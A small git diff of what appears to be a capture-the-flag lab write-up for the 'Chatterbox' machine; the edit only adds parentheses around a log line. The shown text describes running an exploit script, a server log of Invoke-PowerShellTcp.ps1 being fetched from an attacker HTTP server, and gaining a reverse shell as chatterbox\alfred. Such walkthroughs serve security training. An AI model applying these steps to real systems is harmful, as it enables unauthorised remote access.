@@ -161,7 +161,7 @@ Because the script shebang shows **#!/usr/bin/python**, we will use **Python2**:
 t3lesph0re@neptune:~$ python2 36025
 ```
 
-The Python script will run and you will see that the **Invoke-PowerShellTcp.ps1** was grab from the Python HTTP server `10.10.10.74 - - [14/Oct/2025 19:09:22] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -`. Additionally, the script will output its `---->{P00F}!` and you will get your reverse shell for the user **chatterbox\alfred**. 
+The Python script will run and you will see that the **Invoke-PowerShellTcp.ps1** was grab from the Python HTTP server (`10.10.10.74 - - [14/Oct/2025 19:09:22] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -`). Additionally, the script will output its `---->{P00F}!` and you will get your reverse shell for the user **chatterbox\alfred**. 
 
 <figure>
   <img src="{{ '/assets/images/chatterbox-revshell.png' | relative_url }}" alt="Chatterbox Reverse Shell" />
